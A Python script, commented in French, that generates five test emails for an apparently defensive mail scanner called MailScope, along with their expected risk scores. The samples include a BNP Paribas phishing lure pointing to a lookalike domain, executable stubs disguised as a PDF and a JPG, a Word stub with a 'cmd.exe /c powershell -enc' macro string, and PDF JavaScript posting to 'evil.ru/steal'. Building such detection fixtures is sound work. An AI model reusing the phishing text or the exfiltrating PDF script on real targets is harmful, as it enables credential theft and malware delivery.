#!/usr/bin/env python3
"""
Génère 4 emails .eml de test pour MailScope.
Usage : python3 generate_test_emails.py
"""

import os
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

OUT = os.path.join(os.path.dirname(__file__), "test_emails")
os.makedirs(OUT, exist_ok=True)


def save(msg, filename):
    path = os.path.join(OUT, filename)
    with open(path, "w") as f:
        f.write(msg.as_string())
    print(f"  ✓ {filename}")


# ─────────────────────────────────────────────────────────────────
# 01 — Phishing bancaire (Reply-To suspect + IP suspecte + pas d'auth)
# ─────────────────────────────────────────────────────────────────
def gen_01():
    msg = MIMEMultipart("alternative")
    msg["From"] = '"Service BNP Paribas" <noreply@bnp-paribas.fr>'
    msg["To"] = "victime@gmail.com"
    msg["Subject"] = "Action requise : votre compte est suspendu"
    msg["Date"] = "Mon, 19 May 2026 09:12:44 +0200"
    msg["Message-ID"] = "<20260519091244.fake001@mail-relay.ru>"
    msg["Reply-To"] = "collect@secure-bnp-verify.ru"
    msg["X-Originating-IP"] = "185.220.101.47"
    msg["X-Mailer"] = "PhishKit v3.2"
    msg["Received"] = (
        "from mail-relay.ru (185.220.101.47) by mx.gmail.com with SMTP; "
        "Mon, 19 May 2026 00:12:50 -0700"
    )

    text = MIMEText(
        "Votre compte BNP Paribas est suspendu. Cliquez ici : http://secure-bnp-verify.ru/login",
        "plain", "utf-8",
    )
    html = MIMEText(
        """<html><body>
        <p>Cher client,</p>
        <p>Votre compte a été <strong>suspendu</strong>.</p>
        <p><a href="http://secure-bnp-verify.ru/login?token=abc123">Réactiver mon compte</a></p>
        <p>Service Sécurité BNP Paribas</p>
        </body></html>""",
        "html", "utf-8",
    )
    msg.attach(text)
    msg.attach(html)
    save(msg, "01_phishing_reply_to.eml")


# ─────────────────────────────────────────────────────────────────
# 02 — Fausse facture : EXE déguisé en PDF (double extension + MIME mismatch)
# ─────────────────────────────────────────────────────────────────
def gen_02():
    msg = MIMEMultipart()
    msg["From"] = "invoice@legitimate-corp.com"
    msg["To"] = "comptabilite@entreprise.fr"
    msg["Subject"] = "Facture 2026-0547 - Règlement urgent"
    msg["Date"] = "Tue, 20 May 2026 14:33:00 +0200"
    msg["Message-ID"] = "<20260520143300.fake002@legitimate-corp.com>"
    msg["X-Originating-IP"] = "91.108.4.200"
    msg["Received"] = (
        "from legitimate-corp.com (91.108.4.200) by mx.entreprise.fr with SMTP; "
        "Tue, 20 May 2026 14:33:05 +0200"
    )

    body = MIMEText(
        "Bonjour,\n\nVeuillez trouver ci-joint la facture 2026-0547 (4 872,00 EUR).\n\n"
        "Merci de procéder au règlement sous 48h.\n\nCordialement,\nService Comptabilité",
        "plain", "utf-8",
    )
    msg.attach(body)

    # Magic bytes MZ (exécutable Windows) déclaré comme PDF
    exe_bytes = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"\x00" * 300

    part = MIMEBase("application", "pdf")
    part.set_payload(exe_bytes)
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment", filename="Facture_2026-0547.pdf.exe")
    msg.attach(part)

    save(msg, "02_double_extension_exe.eml")


# ─────────────────────────────────────────────────────────────────
# 03 — Document Word avec macros + SPF/DKIM/DMARC fail
# ─────────────────────────────────────────────────────────────────
def gen_03():
    msg = MIMEMultipart()
    msg["From"] = "rh@company-internal.net"
    msg["To"] = "employes@company-internal.net"
    msg["Subject"] = "Nouveau contrat - Merci de signer"
    msg["Date"] = "Wed, 21 May 2026 08:10:00 +0200"
    msg["Message-ID"] = "<20260521081000.fake003@company-internal.net>"
    msg["Authentication-Results"] = (
        "mx.company-internal.net; "
        "spf=fail smtp.mailfrom=company-internal.net; "
        "dkim=fail header.d=company-internal.net; "
        "dmarc=fail"
    )
    msg["Received"] = (
        "from unknown-host.xyz (78.46.200.33) by mx.company-internal.net with SMTP; "
        "Wed, 21 May 2026 08:10:05 +0200"
    )
    msg["X-Originating-IP"] = "78.46.200.33"

    body = MIMEText(
        "Bonjour,\n\nMerci de signer le contrat en pièce jointe avant vendredi.\n\nRH",
        "plain", "utf-8",
    )
    msg.attach(body)

    # Magic bytes OLE (D0 CF 11 E0) + strings VBA pour déclencher détection macros
    ole = (
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
        + b"\x00" * 500
        + b"VBAProject\x00"
        + b"AutoOpen\x00"
        + b"Shell\x00"
        + b"cmd.exe /c powershell -enc aQBlAHgA\x00"
        + b"\x00" * 200
    )

    part = MIMEBase("application", "msword")
    part.set_payload(ole)
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment", filename="Contrat_employe_2026.doc")
    msg.attach(part)

    save(msg, "03_macro_spf_fail.eml")


# ─────────────────────────────────────────────────────────────────
# 04 — PDF avec JavaScript embarqué
# ─────────────────────────────────────────────────────────────────
def gen_04():
    try:
        import fitz  # pymupdf

        doc = fitz.open()
        page = doc.new_page()
        page.insert_text((50, 72), "Facture — Document confidentiel")
        doc.add_js('app.alert("Votre session a expiré"); this.submitForm("http://evil.ru/steal");')
        pdf_bytes = doc.tobytes()
        doc.close()
        print("  [pymupdf disponible] PDF avec JS réel généré")

    except Exception:
        # Fallback : PDF minimal avec /JS dans le dictionnaire
        pdf_bytes = b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 4 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj
4 0 obj<</Type/Action/S/JavaScript/JS(app.alert("pwned"); this.submitForm("http://evil.ru/steal");)>>endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000206 00000 n
trailer<</Size 5/Root 1 0 R>>
startxref
340
%%EOF"""
        print("  [fallback] PDF minimal avec /JS textuel généré")

    msg = MIMEMultipart()
    msg["From"] = "notaire@cabinet-juridique.fr"
    msg["To"] = "client@gmail.com"
    msg["Subject"] = "Document à signer - Acte notarié"
    msg["Date"] = "Thu, 22 May 2026 10:00:00 +0200"
    msg["Message-ID"] = "<20260522100000.fake004@cabinet-juridique.fr>"
    msg["Received"] = (
        "from cabinet-juridique.fr (62.210.180.44) by mx.gmail.com with SMTP; "
        "Thu, 22 May 2026 01:00:05 -0700"
    )

    body = MIMEText(
        "Bonjour,\n\nVeuillez trouver ci-joint l'acte notarié pour signature.\n\nMaître Dupont",
        "plain", "utf-8",
    )
    msg.attach(body)

    part = MIMEBase("application", "pdf")
    part.set_payload(pdf_bytes if isinstance(pdf_bytes, bytes) else pdf_bytes.encode())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment", filename="Acte_notarie_2026.pdf")
    msg.attach(part)

    save(msg, "04_pdf_with_js.eml")


# ─────────────────────────────────────────────────────────────────
# 05 — Image .jpg avec magic bytes MZ (EXE déguisé en photo)
# ─────────────────────────────────────────────────────────────────
def gen_05():
    msg = MIMEMultipart()
    msg["From"] = "contact@agence-photo.fr"
    msg["To"] = "client@entreprise.fr"
    msg["Subject"] = "Photos de votre événement"
    msg["Date"] = "Fri, 23 May 2026 16:45:00 +0200"
    msg["Message-ID"] = "<20260523164500.fake005@agence-photo.fr>"
    msg["Received"] = (
        "from agence-photo.fr (51.75.62.18) by mx.entreprise.fr with SMTP; "
        "Fri, 23 May 2026 16:45:04 +0200"
    )

    body = MIMEText(
        "Bonjour,\n\nVeuillez trouver ci-joint les photos de votre soirée du 15 mai.\n\n"
        "Cordialement,\nL'équipe agence-photo.fr",
        "plain", "utf-8",
    )
    msg.attach(body)

    # Contenu binaire : commence par MZ (0x4D 0x5A) comme un vrai EXE
    # suivi d'un stub PE minimal pour que magic le reconnaisse comme PE32
    mz_payload = (
        b"\x4d\x5a\x90\x00\x03\x00\x00\x00"   # MZ header
        b"\x04\x00\x00\x00\xff\xff\x00\x00"
        b"\xb8\x00\x00\x00\x00\x00\x00\x00"
        b"\x40\x00\x00\x00\x00\x00\x00\x00"
        + b"\x00" * 184 +                       # padding jusqu'à offset 0xc0
        b"\x50\x45\x00\x00"                     # signature PE
        + b"\x00" * 400
    )

    # Déclaré comme image/jpeg avec extension .jpg → MIME mismatch
    part = MIMEBase("image", "jpeg")
    part.set_payload(mz_payload)
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment", filename="photo_evenement_0142.jpg")
    msg.attach(part)

    save(msg, "05_exe_as_jpg.eml")


# ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print(f"\nGénération des emails de test dans ./{os.path.relpath(OUT)}/\n")
    gen_01()
    gen_02()
    gen_03()
    gen_04()
    gen_05()
    print("\nFait. Glisse ces fichiers dans MailScope pour tester.\n")
    print("Scores attendus :")
    print("  01_phishing_reply_to.eml    → Suspect   (~40-50)")
    print("  02_double_extension_exe.eml → Dangereux (~70-90)")
    print("  03_macro_spf_fail.eml       → Dangereux (~80-100)")
    print("  04_pdf_with_js.eml          → Dangereux (~60-80)")
    print("  05_exe_as_jpg.eml           → Dangereux (~60-80)  [MZ dans .jpg]")
